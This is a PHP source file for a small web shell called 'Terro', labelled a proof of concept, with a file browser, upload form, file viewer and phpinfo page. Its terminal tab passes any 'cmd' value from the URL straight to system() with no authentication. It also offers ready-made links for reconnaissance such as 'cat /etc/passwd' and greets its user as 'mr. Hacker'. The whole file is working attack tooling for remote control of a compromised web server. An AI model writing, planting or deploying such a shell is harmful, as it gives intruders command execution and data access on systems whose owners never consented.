<?php

/**
 *    ______
 *   /\__  _\
 *   \/_/\ \/    __   _ __   _ __   ___
 *      \ \ \  /'__`\/\`'__\/\`'__\/ __`\
 *       \ \ \/\  __/\ \ \/ \ \ \//\ \L\ \
 *        \ \_\ \____\\ \_\  \ \_\\ \____/
 *         \/_/\/____/ \/_/   \/_/ \/___/
 *
 * Simple PHP WebShell
 *
 * CHANGES / VERSION HISTORY:
 *
 * =====================================================================================
 * | Version |  Description                                                            |
 * | - - - - | - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - |
 * | 0.0.1   |   Initial version of WebShell                                           |
 * =====================================================================================
 *
 */

// Array com sintaxe compatível com PHP 5.2
$app = array('title' => "Terro", 'version' => "0.0.1 PoC");

$serverName = php_uname();

$apacheVersion = isset($_SERVER['SERVER_SIGNATURE']) ? $_SERVER['SERVER_SIGNATURE'] : '';

$phpVersion = phpversion();

// Evita acessar índice diretamente no retorno de explode()
$tmp = explode("?", $_SERVER['REQUEST_URI']);
$myUrl = $tmp[0];

$serverIP = $_SERVER['SERVER_ADDR'];

// PHP 5.2 NÃO tem gethostname() – usamos php_uname('n')
$serverHostName = php_uname('n');

$clientIP = $_SERVER['REMOTE_ADDR'];

$currentTab = isset($_GET['tab']) ? $_GET['tab'] : '';

if(isset($_GET['chdir'])) {
    $dir = _convert_from_url($_GET['chdir']);
    @chdir($dir);
}

if(isset($_GET['changedir'])) {
    header("Location: ". $myUrl. "?tab=terminal&cmd=".$_GET['cmd']."&chdir="._convert_to_url($_GET['changedir']));
}

$currentDir = getcwd() . DIRECTORY_SEPARATOR;

// Função auxiliar para obter nome do proprietário (fallback se posix_getpwuid não existir)
function _get_owner_name($uid) {
    if (function_exists('posix_getpwuid')) {
        $info = posix_getpwuid($uid);
        return isset($info['name']) ? $info['name'] : $uid;
    } else {
        return $uid; // ou 'unknown'
    }
}

?>

<!doctype html>
<html lang="en">
    <head>
        <title><?php echo $app['title']; ?></title>
        <style>
            body { padding: 0; margin: 0}
            a.menu { border-bottom: 3px solid transparent; color: #797979; font-weight: bold; padding: 10px 10px; margin-left: -5px; display: block; margin-right: 10px; text-decoration: none; font-family: 'system-ui'; font-size: 14px; }
            a.menu.active, a.menu:hover { color: black; }
            h4 { font-family: 'system-ui'; color: #1f1f1f; font-size: 30px; margin-top: 3px;}
            td#header span { color: gold; font-weight: bold }
            #filelist a { color: black; font-weight: bold; text-decoration: none }
            #filelist #filelist_header { background: #eee;  }
            #filelist #filelist_header td { color: black; font-weight: bold; border-radius: 5px; }
            #filelist tr td { padding: 10px 10px;  border-bottom: 1px solid #eee; }
            #fileviewer pre { width: calc(100% - 20px); display: block; background: #eee; padding: 10px; overflow-y: scroll }
        </style>
    </head>
    <body style="background: white;">
        <div style="height: calc(100vh - 40px); display: block; width: calc(100% - 40px); padding: 20px">
            <div style="display: inline-block; width: 200px; float: left">
                <h3 style="  font-family: 'system-ui'; font-weight: 100; margin-top: 3px; padding: 0; margin-bottom: 0; display: inline-block; font-size: 28px; color: #1f1f1f">
                    <?php echo $app['title']; ?>
                    <small style="font-size: 10px">ver. <?php echo $app['version']; ?></small>
                </h3>
                <br/><br/><br/>
                <a class="menu <?php if($currentTab == "home" || $currentTab == "") { echo "active"; } ?>"href="<?php echo $myUrl; ?>?tab=home&chdir=<?php echo _convert_to_url($currentDir); ?>">Home</a>
                <a class="menu <?php if($currentTab == "file-manager" || $currentTab == "show-file") { echo "active"; } ?>" href="<?php echo $myUrl; ?>?tab=file-manager&chdir=<?php echo _convert_to_url($currentDir); ?>">File browser</a>
                <a class="menu <?php if($currentTab == "terminal") { echo "active"; } ?>" href="<?php echo $myUrl; ?>?tab=terminal&cmd=ls&chdir=<?php echo _convert_to_url($currentDir); ?>">Terminal</a>
                <a class="menu <?php if($currentTab == "phpinfo") { echo "active"; } ?>" href="<?php echo $myUrl; ?>?tab=phpinfo&chdir=<?php echo _convert_to_url($currentDir); ?>">phpinfo();</a>
            </div>
            <div style="display: inline-block; width: calc(100% - 200px - 80px); float: right">

                <?php if($currentTab == "home"  || $currentTab == "") { ?>
                    <h4>Hello mr. Hacker!</h4>
                    <pre><?php echo $serverName; ?> <br/><b>host: <?php echo $serverHostName; ?> | ip: <?php echo $serverIP; ?></b></pre>
                    <p>Linux services status: <code style="background: gold; color: black; padding: 5px;">service --status-all</code> output:</p>
                    <pre><?php system('service --status-all'); ?></pre>
                 <?php } ?>

                <?php if($currentTab == "file-manager") { ?>
                    <h4>File browser</h4>
                    <p>Current directory: <?php echo $currentDir; ?></p>
                    <table id="filelist" style="width: 100%">
                        <?php if(isset($_FILES["file"])) { ?>
                            <?php $target_file = $currentDir . basename($_FILES["file"]["name"]); ?>
                            <?php if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) { ?>
                                <tr>
                                    <td colspan="5" style="background: green; color: white;">The file <?php echo htmlspecialchars( basename( $_FILES["file"]["name"])); ?> has been uploaded</td>
                                </tr>
                            <?php } else { ?>
                                <?php 
                                    // error_get_last() existe no PHP 5.2, mas evitamos acesso direto
                                    $lastError = error_get_last(); 
                                    $msg = isset($lastError['message']) ? $lastError['message'] : '';
                                ?>
                                <tr>
                                    <td colspan="5" style="background: red; color: white;">Sorry, there was an error uploading your file. <?php echo $msg; ?></td>
                                </tr>
                            <?php } ?>
                        <?php } ?>

                        <tr id="filelist_header"><td>Name</td><td>Size</td><td>Modify</td><td>Owner</td><td>Permissions</td></tr>

                        <?php $list = scandir($currentDir); ?>
                        <?php foreach ($list as $directory) { ?>
                            <?php if($directory == ".") { continue; } ?>
                            <?php if(is_dir($currentDir.$directory)) { 
                                $ownerId = @fileowner($currentDir.$directory);
                                $ownerName = _get_owner_name($ownerId);
                            ?>
                                <tr>
                                    <td width="35%"><b><a href="<?php echo $myUrl; ?>?tab=file-manager&chdir=<?php echo _convert_to_url($currentDir.$directory); ?>">[<?php echo $directory; ?>]</a></b></td>
                                    <td width="15%">directory</td>
                                    <td width="20%"><?php echo date("Y-m-d H:i:s", filemtime($currentDir.$directory)); ?></td>
                                    <td width="10%"><?php echo $ownerName; ?></td>
                                    <td width="20%"><?php echo _fileperms($currentDir.$directory); ?></td>
                                </tr>
                            <?php } ?>
                        <?php } ?>
                        <?php foreach ($list as $directory) { ?>
                            <?php if($directory == ".") { continue; } ?>
                            <?php if(!is_dir($currentDir.$directory)) {  
                                $ownerId = @fileowner($currentDir.$directory);
                                $ownerName = _get_owner_name($ownerId);
                            ?>
                                <tr>
                                    <td><a href="<?php echo $myUrl; ?>?tab=show-file&filepath=<?php echo _convert_to_url($currentDir.$directory); ?>"><?php echo $directory; ?></a></td>
                                    <td><?php echo _human_filesize(filesize($currentDir.$directory)); ?></td>
                                    <td><?php echo date("Y-m-d H:i:s", filemtime($currentDir.$directory)); ?></td>
                                    <td><?php echo $ownerName; ?></td>
                                    <td><?php echo _fileperms($currentDir.$directory); ?></td>
                                </tr>
                            <?php } ?>
                        <?php } ?>
                    </table>

                    <p>Upload file here:</p>
                    <form method="POST" enctype="multipart/form-data"
                          action="<?php echo $myUrl; ?>?tab=file-manager&upload=1&chdir=<?php echo _convert_to_url($currentDir); ?>">
                        <input type="file" name="file">
                        <input type="submit" value="Upload file to current directory">
                    </form>
                <?php } ?>

                <?php if($currentTab == "show-file") { ?>
                    <?php $filePath = _convert_from_url($_GET['filepath']); ?>
                    <h4>File viewer</h4>

                    <div id="fileviewer">
                        <a onclick="window.history.back()" style="cursor: pointer; color: red">❮ back</a> <p>File: <b><?php echo $filePath; ?></b></p>
                        <pre><?php echo htmlentities(file_get_contents($filePath)); ?></pre>
                    </div>
                <?php } ?>

                <?php if($currentTab == "phpinfo") { ?>
                    <h4>phpinfo();</h4>
                    <?php _get_phpinfo(); ?>
                <?php } ?>

                <?php if($currentTab == "terminal") { ?>
                    <h4>Terminal</h4>

                    <table style="background: #eee; border-radius: 5px; padding: 10px;">
                        <tr>
                            <td>
                                <form method="GET" action="<?php echo $myUrl; ?>?tab=terminal">
                                    Execute command:
                                    <input type="hidden" name="tab" value="terminal">
                                    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
                                    <input type="hidden" name="chdir"  value="<?php echo _convert_to_url($currentDir); ?>" size="80">
                                    <input type="SUBMIT" value="Execute">
                                </form>
                            </td>
                            <td style="vertical-align: top">
                                <form method="GET" action="<?php echo $myUrl; ?>?tab=terminal">
                                    Change directory:
                                    <input type="hidden" name="tab" value="terminal">
                                    <input type="hidden" name="cmd" value="ls">
                                    <input type="TEXT" name="changedir" autofocus id="changedir" size="80">
                                    <input type="SUBMIT" value="Change directory">
                                </form>
                            </td>
                        </tr>
                        <tr>
                            <td colspan="2">
                                <br/>

                                <?php if(isset($_GET['cmd'])) { ?>
                                    <p>Output:</p>
                                    <pre style="background: #1f1f1f; color: white; padding: 10px;"><span style="color: gold"><b><?php echo get_current_user(); ?>@</b><?php echo $currentDir; ?></span> $ <?php echo $_GET['cmd']; ?><br/><?php system($_GET['cmd']); ?></pre>
                                <?php } ?>
                            </td>
                        </tr>

                        <tr>
                            <td colspan="2">
                                <p>Useful commands</p>
                                <p>
                                    <a class="cmd-link" href="<?php echo $myUrl; ?>?tab=terminal&chdir=<?php echo _convert_to_url($currentDir); ?>&cmd=ifconfig">[ifconfig]</a>
                                    <a class="cmd-link" href="<?php echo $myUrl; ?>?tab=terminal&chdir=<?php echo _convert_to_url($currentDir); ?>&cmd=cat /etc/passwd">[cat /etc/passwd]</a>
                                </p>
                            </td>
                        </tr>
                    </table>
                <?php } ?>
                <br/><br/>
            </div>
        </div>
    </body>
</html>


<?php

function _convert_to_url($path) {
    return base64_encode($path);
}

function _convert_from_url($url) {
    return base64_decode($url);
}

function _fileperms($path) {
    $perms = fileperms($path);

    switch ($perms & 0xF000) {
        case 0xC000: // socket
            $info = 's';
            break;
        case 0xA000: // symbolic link
            $info = 'l';
            break;
        case 0x8000: // regular
            $info = 'r';
            break;
        case 0x6000: // block special
            $info = 'b';
            break;
        case 0x4000: // directory
            $info = 'd';
            break;
        case 0x2000: // character special
            $info = 'c';
            break;
        case 0x1000: // FIFO pipe
            $info = 'p';
            break;
        default: // unknown
            $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x' ) :
        (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x' ) :
        (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x' ) :
        (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function _human_filesize($bytes, $dec = 2) {
    $size   = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $factor = floor((strlen($bytes) - 1) / 3);

    return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) ." ". @$size[$factor];
}

function _get_phpinfo() {
    ob_start();
    phpinfo();
    $phpinfo = ob_get_contents();
    ob_end_clean();
    $phpinfo = preg_replace('%^.*<body>(.*)</body>.*$%ms', '$1', $phpinfo);
    echo "
        <style type='text/css'>
            #phpinfo {}
            #phpinfo pre {margin: 0; font-family: monospace;}
            #phpinfo a:link {color: black; text-decoration: none; background-color: #fff;}
            #phpinfo a:hover {text-decoration: underline;}
            #phpinfo table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
            #phpinfo .center {text-align: center;}
            #phpinfo .center table {margin: 1em auto; text-align: left;}
            #phpinfo .center th {text-align: center !important;}
            #phpinfo td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
            #phpinfo h1 {font-size: 150%;}
            #phpinfo h2 {font-size: 125%;}
            #phpinfo .p {text-align: left;}
            #phpinfo .e {background-color: gold; width: 300px; font-weight: bold; color: black; }
            #phpinfo .h {background-color: gold; font-weight: bold; padding: 10px; color: black; }
            #phpinfo .v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word; color: black}
            #phpinfo .v i {color: #999;}
            #phpinfo img {float: right; border: 0;}
            #phpinfo hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
        </style>
        <div id='phpinfo'>
            $phpinfo
        </div>
        ";
}